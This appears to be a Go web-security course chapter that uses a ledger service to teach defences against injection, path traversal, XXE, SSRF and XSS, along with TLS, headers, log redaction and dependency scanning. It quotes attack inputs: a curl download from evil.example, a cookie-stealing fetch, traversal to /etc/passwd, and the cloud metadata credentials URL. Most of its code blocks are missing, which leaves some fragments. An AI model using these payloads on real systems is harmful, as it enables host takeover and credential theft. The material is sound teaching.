text: A length-prefixed or offset-based format lets the input declare how big something is — an image dimension, a table-entry count, a file offset. If a parser allocates that much before checking it against how much data actually arrived , a handful of bytes can demand gigabytes: make([]byte, n) where n is attacker-controlled. The process OOM-kills itself. http.MaxBytesReader — the body ceiling from Input is Hostile above — can't see this : it caps the bytes read off the wire, but the runaway make happens inside the decoder , driven by a header field the body limit never inspects. Every parser of an untrusted binary format needs its own ceiling. This is not hypothetical, and it is not confined to code you wrote — it lives in Go's own extended standard library. In March 2026 a fuzzing campaign against golang.org/x/image produced CVE-2026-33809 : an 8-byte TIFF file crashes any Go process that decodes it. The bytes are a valid little-endian TIFF header followed by an IFD offset of 0xFFFFFFFF: When tiff.Decode reads through the non-io.ReaderAt path (a plain io.Reader), its internal buffer.fill grew toward that 4 GB offset in one make, allocating 4 GB of zeroes to service 8 bytes of input —

heading: The Injection Family
text: Three classic injection attacks. They share one root cause: untrusted input is treated as code or a path rather than as data. Go's standard tooling closes each one cleanly — but only if you reach for the right tool.

heading: SQL injection
text: SQL injection happens when user-supplied text is concatenated directly into a SQL query string. The database can't tell where the query ends and the data begins, so an attacker encodes SQL syntax inside their input — ending a string literal, adding a OR 1=1, calling DROP TABLE — and the database executes it as a real query. At Meridian, a single injected promo code could return every discount in the table, or silently delete the ledger. The fix is always a parameterized query : the query template and the values travel as separate wire messages; the driver ensures values are never interpreted as SQL. SQL injection happens when user-supplied text lands inside a query string and the database interprets it as SQL syntax. The canonical example is a promo code field: The parameterized form sends the query string and the argument to the database as separate wire messages . The database never concatenates them. The user's input is always a typed value in a column comparison — it physically cannot become SQL syntax. This was covered in depth in the databases chapter; here it's restated as a security control: every query that touches external input must be parameterized, no exceptions. The a

heading: Try it: an interactive SQLi lab
text: Bypass a login with admin' -- against a string-built query — then flip to the parameterized version and watch the exact same injection fail, because the value can never reach the SQL parser. (Fully in-browser, nothing real is touched.)

heading: Command injection
text: Command injection happens when user-supplied input is passed to a shell interpreter as part of a command string. The shell tokenizes the string, so characters like ;, &&, $(), or a backtick become statement separators — a second command the attacker wrote, running with your service's privileges. If Meridian's receipt-conversion job passes a user filename to /bin/sh -c "convert " + filename, an attacker can append ; curl evil.example/backdoor sh and own the host. os/exec lets Go run external programs. The footgun is exec.Command("/bin/sh", "-c", userInput) — passing user input to a shell interpreter as a single string. The shell tokenizes it, which means a ;, &&, $(), or backtick in the input becomes a second command: The fix: never pass a shell interpreter a string containing user input. Pass the binary path and each argument as a separate string to exec.Command. The OS hands them directly to execve without any shell in the middle. Add "--" as an argument-terminator before any user-supplied filename to prevent it from being parsed as a flag.

heading: Path traversal
text: Path traversal (also called directory traversal) is an attack where an attacker supplies ../ sequences in a filename or URL path to escape an intended directory. If Meridian's receipt API joins /data/receipts/ with a user-supplied filename directly, the input ../../etc/passwd resolves outside the receipts directory — potentially exposing system files or secrets. The fix is filepath.Clean to collapse all .. segments, followed by a strings.HasPrefix containment check to confirm the resolved path is still inside the permitted root. A path traversal attack uses ../ sequences to escape an intended directory. If your ledger API serves uploaded receipts from /data/receipts/ and the filename comes from the user, the input ../../etc/passwd resolves to a path well outside receipts. filepath.Clean resolves all ., .., and redundant separators to a canonical path. After cleaning, a strings.HasPrefix check against the expected root catches any attempt that escaped. Note the trailing / in the prefix: without it, a root of /data/receipts would also permit /data/receipts-other/. filepath.Clean is a pure path algebra function — it applies a fixed set of reduction rules: 1. Replace multiple slashes w

heading: Try it: a path-traversal lab
text: Supply a path to a file server and watch a vulnerable (string-check) server and a safe (os.Root) server resolve it differently — including the symlink trick that defeats the lexical check. (In-browser; the filesystem is modeled.)

heading: XXE — and why Go's stdlib is mostly immune
text: XXE abuses a feature of XML: a document can declare entities in its DOCTYPE, and an external entity ( ) tells the parser to fetch and inline an external resource. On a parser that resolves external entities, referencing &xxe; in the body makes the parser read a local file (arbitrary file disclosure), make a request to an internal URL (SSRF), or expand entities recursively until memory is exhausted (the "billion laughs" denial-of-service). XXE is a classic high-severity bug in XML-heavy ecosystems (Java, .NET) where parsers historically resolved external entities by default. Here's the good news for Go: the standard library's encoding/xml does not resolve external entities at all. It doesn't fetch external DTDs, and an undefined entity reference is simply an error. The classic file-read payload doesn't leak anything — it fails to parse. Watch: Go's encoding/xml is near-immune to XXE — but "near" is doing work, so don't get complacent. The stdlib never resolves external entities (&xxe; is an undefined-entity error , not a file read) and never fetches external DTDs, so the classic file-disclosure/SSRF payloads simply fail to parse. The risks that remain: (1) third-party XML libraries

heading: NoSQL injection — operators where you expected a string
text: SQL isn't the only query language you can inject into. Document databases (MongoDB and friends) take query objects , and if user input flows into that object as structure rather than a value , an attacker can smuggle in a query operator — bypassing authentication without ever knowing a password. NoSQL injection abuses the fact that a document-database query is itself a structured object , where keys like $ne, $gt, $where, or $regex are operators . A login that builds its filter from user input — — is safe only if each input is a plain value . But if the client can supply an object where a string was expected — e.g. JSON — the password field becomes the operator $ne: null ("password is not null"), which matches the admin's real password and logs the attacker in without it . The root cause in Go is decoding untrusted input into a free-form type (map[string]any / bson.M) that can hold an operator object; the fix is to decode into a typed struct whose fields are plain strings, so an operator object can't fit and the request is rejected before it ever reaches the database.

heading: SSRF
text: SSRF is an attack where an attacker tricks your service into making an outbound HTTP request to a URL they control — typically an internal endpoint your service can reach but the attacker cannot. Your service has access to internal services behind a firewall, cloud metadata endpoints (169.254.169.254 on AWS returns IAM credentials to any EC2 process), and private VPCs. They all trust requests coming from your IP. If the attacker steers your service, they inherit that trust. At Meridian, a merchant who can set a webhook URL can point it at the instance metadata service and walk out with production credentials. Server-side request forgery (SSRF) is what happens when your service makes an outbound HTTP request to a URL that the user controls. Your ledger API might let merchants configure a webhook URL to receive payment notifications. Sounds fine. Now an attacker sets that URL to http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role — the AWS instance metadata endpoint that hands back IAM credentials to any process running on the EC2 instance. The threat model: your service has access to resources that the attacker doesn't. Internal services behind a firewall, clo

heading: Why the naive HTTP client is dangerous here
text: The default http.Client will happily follow that URL, and the instance metadata service will respond with credentials.

heading: Locking out internal endpoints
text: The defense is a custom http.Client with a dialing hook that validates the resolved IP before opening the connection: The Control callback fires after DNS resolution and before the TCP connection is opened. By that point we know the final IP — there's no TOCTOU window between the check and the dial. If DNS resolves a "safe" hostname to 169.254.169.254 (DNS rebinding), we still catch it because the control fires on the resolved IP. If your service only ever needs to call Stripe, your own internal service mesh, or a small set of known partners, allow-list the destinations rather than blocklisting everything private. An allow-list of ["api.stripe.com", "hooks.yourco.internal"] is far stronger than a blocklist of RFC 1918 ranges — the attacker can't bypass it by finding a public IP that proxies to a private one.

heading: XSS and html/template
text: XSS is an attack where an attacker injects JavaScript into a page your server renders, which then executes in a victim's browser — stealing session cookies, exfiltrating tokens, or hijacking the page entirely. The vector: user-controlled text lands in HTML output without being escaped. Go's html/template package is the defense: it is a context-aware compiler that tracks whether each action is in an HTML body, an attribute, a href, or a block, and applies the correct escaping automatically. Unlike text/template, which outputs strings verbatim, html/template makes XSS opt-in rather than opt-out — you have to deliberately use template.HTML to bypass it. Cross-site scripting (XSS) is a class of attack where an attacker injects JavaScript into a page your server renders, and that JavaScript executes in a victim's browser — stealing session cookies, exfiltrating tokens, or hijacking the page. The vector: user-controlled text lands in HTML output without being escaped. Your ledger service has an admin dashboard that renders transaction descriptions server-side. A merchant sets their business name to fetch('https://evil.example/steal?c='+document.cookie) . If your template inserts that str

heading: The rule: html/template, never text/template
text: Go ships two template packages: text/template — generic text generation. It outputs strings as-is. If you put user data through it into an HTML context, you have an XSS vulnerability. html/template — HTML-aware. It tracks the context (HTML body, attribute value, tag, URL attribute) and escapes the data appropriately for that context automatically. This is the one you use for server-rendered HTML. Every time. ... executes. const tmpl = \ \ t := template.Must( template.New("row").Parse(tmpl)) t.Execute(w, data)} good= / The import path is the only change. The template syntax is identical. But html/template is a context-aware compiler, not a string interpolator. Run it. The tag is rendered as <script>...</script> — angle brackets become HTML entities. The browser displays the text. It does not execute the JavaScript.

heading: How context-tracking works (and how template.HTML defeats it)
text: html/template parses the template at compile time (template.Must/Parse) into a context-aware tree . Each action ( ) knows its context: is it inside an HTML tag body? An attribute value? A block? A href attribute? The escaper picks the correct escaping function for each context. The footgun: template.HTML is an explicit bypass. The instant you do template.HTML(userInput), you've told the engine the user's string is pre-approved HTML and it re-introduces the XSS vulnerability. Never do this with external input. The only legitimate use of template.HTML is for HTML you generated in your own code that you know is clean. ..." }, , , ]} caption="html/template escapes at the point of injection, in the correct context, automatically." / html/template is a static analyzer wrapped around text/template. When you call Parse, it walks the template's parse tree and annotates every action with an escapeState — a value from the context type that encodes where in the HTML document the action lives. The state machine has roughly a dozen states: stateText (HTML body), stateAttr (an attribute value), stateURL (a href or src), stateJS (inside a block), stateCSS (inside a ), stateAttrName, and a few more

heading: Try it: an interactive XSS lab
text: Type a payload and watch it execute in a vulnerable app — then watch the identical payload rendered inert by html/template. Same input, opposite outcome. (Fully in-browser; execution is simulated — no real script runs.)

heading: Transport and Headers
text: A hardened application layer means nothing if the transport is insecure or the browser doesn't know your content policy. Two controls: TLS enforcement and security headers.

heading: Enforce TLS
text: Your service should never serve plain HTTP in production. If you're behind a reverse proxy (nginx, Caddy, a cloud load balancer), the proxy terminates TLS and forwards X-Forwarded-Proto: https — you should check that header and redirect if it's missing: If Go's net/http server is terminating TLS directly (not behind a proxy), use http.ListenAndServeTLS and supply a valid certificate. crypto/tls has defaulted to a TLS 1.2 minimum since Go 1.18 (with a safe cipher suite list) — you should not override MinVersion downward.

heading: The security headers every handler should send
text: Five headers. They're cheap to add, and each closes a class of browser-side attack: HSTS. Tells the browser to always use HTTPS for this domain for the specified max-age (seconds). Once set, the browser never makes a plain HTTP request — not even on first visit if the HSTS preload list includes your domain. Declares which origins may load scripts, styles, images, and other resources. default-src 'self' blocks all third-party content — essential for preventing injected scripts from loading external payloads. Prevents the browser from MIME-sniffing a response away from the declared Content-Type. Without it, a file upload returned with Content-Type: text/plain might be executed as HTML by some browsers if it looks like HTML. Prevents the page from being embedded in an iframe on another origin — the mechanism behind clickjacking attacks where an attacker overlays a transparent iframe over a button the victim clicks. Controls how much URL information is sent in the Referer header. strict-origin-when-cross-origin sends the full URL for same-origin navigations, only the origin for cross-origin HTTPS → HTTPS, and nothing for HTTPS → HTTP. HSTS is a one-way ratchet. Once a browser caches an

heading: Secrets out of Logs
text: This one sounds obvious. People still do it every day. Let me be vivid about why: a database connection string postgres://app:S3cr3tP4ss@rds.amazonaws.com/ledger written to a log file is a credential exposed to everyone with log-read access — and log storage is often far less locked down than secret storage. A JWT token in a log is a valid session credential until it expires. A customer's full credit card number in a log is a PCI violation. The controls:

heading: Never log raw errors from sensitive operations
Redact secret types at the boundary
text: Use a custom type with a String() method that never reveals the value. Configuration & Secrets Management covers this in depth; here's the pattern in brief: Any struct field typed as Secret can be passed to slog, fmt.Println, or fmt.Errorf — it will always print [REDACTED]. This closes the "oops, I logged the whole config struct" footgun. slog.Error("user login", "password", password) puts the password in a structured field named "password" — some log processors will redact known-sensitive field names. fmt.Sprintf("user %s logged in with password %s", user, password) will not, because the structure is gone. Prefer slog with typed fields for everything that matters, and use the Secret type for values that must never appear in any output.

heading: Supply-Chain Scanning
text: govulncheck is the Go security team's official vulnerability scanner, backed by the Go vulnerability database at vuln.go.dev. Unlike dependency-list scanners that flag every module with any CVE regardless of call reachability, govulncheck performs call-graph analysis : it only reports vulnerabilities in functions your binary actually calls. A vulnerable function in a transitive dependency you never invoke is not reported — dramatically reducing noise. A flagged vulnerability includes the exact call chain that reaches the vulnerable code, the affected module version, and the fixed version. It belongs in CI as a hard gate: if it exits non-zero, the build fails and the vulnerable code does not ship. Your service is only as secure as its weakest dependency. A vulnerability in a Go module you import is a vulnerability in your binary. Go's official answer is govulncheck.

heading: govulncheck
text: govulncheck is maintained by the Go security team and backed by the Go vulnerability database at vuln.go.dev. Unlike a dependency-list scan that flags every package with any CVE, govulncheck performs call-graph analysis — it only reports vulnerabilities in code your binary actually calls. A vulnerable function in a dependency you import but don't call is not reported. This dramatically reduces noise. Sample output when a vulnerability is found: It tells you the module, the affected version, the fixed version, and — crucially — the call chain that reaches the vulnerable code. Run go get golang.org/x/net@v0.23.0 && go mod tidy and re-run govulncheck to confirm clean.

heading: Wiring it into CI
text: Add a step to your GitHub Actions workflow (or equivalent) so a known-vulnerable module fails the build rather than shipping: Pair it with go mod verify (checks that downloaded modules match their checksums in go.sum) and the go.sum file committed to the repository (so the build is reproducible and tamper-evident). Tools like Snyk, Dependabot, and nancy scan your dependency graph and flag any module with a known CVE, regardless of whether your code actually calls the vulnerable function. This produces many false positives. govulncheck uses a binary/source call graph and only reports reachable vulnerabilities — far more actionable. Use govulncheck as your primary Go vulnerability gate; dependency scanners are a useful secondary layer for SBOMs and audit trails. --

text: Stop admiring the theory. Ship the fix. Write an HTTP handler BudgetHandler that decodes a JSON body into a struct BudgetRequest . The handler must: 1. Cap the body at 512 KB with http.MaxBytesReader. 2. Reject unknown fields. 3. Return 400 if AmountCents is not positive. DisallowUnknownFields turns unknown JSON keys into a decode error rather than silently dropping them. MaxBytesReader prevents a large body from exhausting server memory. Write a function SafeStatementPath(root, name string) (string, error) that: 1. Joins root and name with filepath.Join. 2. Applies filepath.Clean. 3. Returns an error if the cleaned path is not strictly inside root (not just a prefix match — it must be a child, not a sibling). 4. Returns the clean path on success. Test it with "../../etc/shadow", "2024/jan.pdf", and "../statements-archive/old.pdf". The key detail: filepath.Clean(root)+string(filepath.Separator) normalizes the root and appends the separator before the prefix check, so a sibling directory sharing a name prefix can't slip through. heading: The Lab
text: Listen up, sport. You've had the theory. You've done the drills. Now I'm going to personally put you in the room with a live, broken service and see what you're actually made of. The ledger API's receipt-viewer handler is vulnerable to path traversal. A deliberate weakness — a test target running only inside this sandbox , isolated from everything real. Your mission in two acts: 1. Break it. Craft a request that escapes the receipts directory and reads a file outside it. When you succeed, the handler echoes back the file contents — that string is the flag. 2. Fix it. Patch the handler so the same request returns 403 and a regression test (TestTraversalBlocked) passes, confirming the exploit no longer works. The verifier runs TestTraversalBlocked. When that test passes and the exploit request returns 403, the flag is yours. This is a fully sandboxed target. There is nothing real to damage. Go. The vulnerable handler is live and observable. No exploit steps needed — just fix the containment logic so the self-check's three httptest scenarios all pass. Get ALL CHECKS PASS and the flag is yours. Input is hostile.
